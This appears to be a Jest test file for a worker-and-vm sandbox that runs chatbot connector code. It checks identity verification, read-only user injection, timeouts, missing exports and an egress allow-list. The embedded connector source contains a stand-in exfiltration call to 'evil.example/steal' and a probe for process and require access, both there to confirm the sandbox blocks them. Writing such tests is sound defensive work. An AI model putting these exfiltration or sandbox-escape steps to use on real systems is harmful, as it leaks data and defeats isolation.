'use strict';

const {
  ConnectorRuntime,
} = require('../../src/modules/realtime/infrastructure/connector-runtime');

const CONNECTOR_SOURCE = `'use strict';

async function verifyIdentity(token, ctx) {
  if (token !== 'good-token') throw new Error('Invalid token');
  return { id: 'user-1', email: 'user@example.com' };
}

async function fetchContext({ message, user, route }, ctx) {
  if (message === 'hang') return new Promise(() => {});
  if (message === 'escape') {
    return {
      hasProcess: typeof process !== 'undefined',
      hasRequire: typeof require !== 'undefined',
      hasSetTimeout: typeof setTimeout !== 'undefined',
    };
  }
  if (message === 'mutate') {
    try {
      ctx.user.id = 'someone-else';
      return { mutated: ctx.user.id };
    } catch {
      return { frozen: true, userId: ctx.user.id };
    }
  }
  if (message === 'http') {
    await ctx.http('https://evil.example/steal');
    return { fetched: true };
  }
  if (message === 'embed') {
    const vector = await ctx.embed('hello');
    return { dims: vector.length, first: vector[0] };
  }
  return { echo: message, userId: user.id, route: route ? route.name : null };
}

module.exports = { verifyIdentity, fetchContext };
`;

describe('ConnectorRuntime (worker + vm sandbox)', () => {
  const openaiStub = {
    createEmbeddings: async (texts) => texts.map(() => [3, 4]),
  };
  let runtime;

  const connector = {
    chatbotId: 'bot-1',
    version: 'v1',
    source: CONNECTOR_SOURCE,
    baseUrl: '',
    allowedHosts: [],
    secrets: { apiKey: 'sk-hidden' },
    intents: [],
    cacheScope: 'conv-1',
  };

  beforeAll(() => {
    runtime = new ConnectorRuntime({
      openai: openaiStub,
      config: { workerCount: 1, fetchTimeoutMs: 500, httpTimeoutMs: 200 },
    });
  });

  afterAll(async () => {
    await runtime.stop();
  });

  it('verifies identity through the connector', async () => {
    const outcome = await runtime.run({
      connector,
      fn: 'verifyIdentity',
      args: { token: 'good-token' },
      timeoutMs: 2000,
    });
    expect(outcome.ok).toBe(true);
    expect(outcome.result).toEqual({
      id: 'user-1',
      email: 'user@example.com',
    });
  });

  it('rejects an invalid token as a failed call, not a crash', async () => {
    const outcome = await runtime.run({
      connector,
      fn: 'verifyIdentity',
      args: { token: 'bad' },
      timeoutMs: 2000,
    });
    expect(outcome.ok).toBe(false);
    expect(outcome.error).toContain('Invalid token');
  });

  it('executes fetchContext with the injected user and route', async () => {
    const outcome = await runtime.run({
      connector,
      fn: 'fetchContext',
      args: {
        message: 'where is my order',
        embedding: [1, 0],
        user: { id: 'user-1' },
        snapshot: null,
        route: { name: 'orders' },
      },
      timeoutMs: 2000,
    });
    expect(outcome.ok).toBe(true);
    expect(outcome.result).toEqual({
      echo: 'where is my order',
      userId: 'user-1',
      route: 'orders',
    });
  });

  it('exposes no process, require, or timers inside the sandbox', async () => {
    const outcome = await runtime.run({
      connector,
      fn: 'fetchContext',
      args: { message: 'escape', user: { id: 'user-1' } },
      timeoutMs: 2000,
    });
    expect(outcome.ok).toBe(true);
    expect(outcome.result).toEqual({
      hasProcess: false,
      hasRequire: false,
      hasSetTimeout: false,
    });
  });

  it('injects the identity read-only', async () => {
    const outcome = await runtime.run({
      connector,
      fn: 'fetchContext',
      args: { message: 'mutate', user: { id: 'user-1' } },
      timeoutMs: 2000,
    });
    expect(outcome.ok).toBe(true);
    expect(outcome.result).toEqual({ frozen: true, userId: 'user-1' });
  });

  it('blocks requests to hosts outside the egress allow-list', async () => {
    const outcome = await runtime.run({
      connector,
      fn: 'fetchContext',
      args: { message: 'http', user: { id: 'user-1' } },
      timeoutMs: 2000,
    });
    expect(outcome.ok).toBe(false);
    expect(outcome.error).toContain('allow-list');
  });

  it('resolves the embed capability through the main thread, normalized', async () => {
    const outcome = await runtime.run({
      connector,
      fn: 'fetchContext',
      args: { message: 'embed', user: { id: 'user-1' } },
      timeoutMs: 2000,
    });
    expect(outcome.ok).toBe(true);
    expect(outcome.result.dims).toBe(2);
    expect(outcome.result.first).toBeCloseTo(0.6);
  });

  it('times out a hung connector without blocking', async () => {
    const started = Date.now();
    const outcome = await runtime.run({
      connector,
      fn: 'fetchContext',
      args: { message: 'hang', user: { id: 'user-1' } },
      timeoutMs: 250,
    });
    expect(outcome.ok).toBe(false);
    expect(outcome.error).toContain('timed out');
    expect(Date.now() - started).toBeLessThan(2000);
  });

  it('fails cleanly when the export is missing', async () => {
    const outcome = await runtime.run({
      connector: {
        ...connector,
        version: 'v2',
        source: 'module.exports = {};',
      },
      fn: 'fetchContext',
      args: { message: 'x', user: { id: 'user-1' } },
      timeoutMs: 2000,
    });
    expect(outcome.ok).toBe(false);
    expect(outcome.error).toContain('does not export');
  });
});
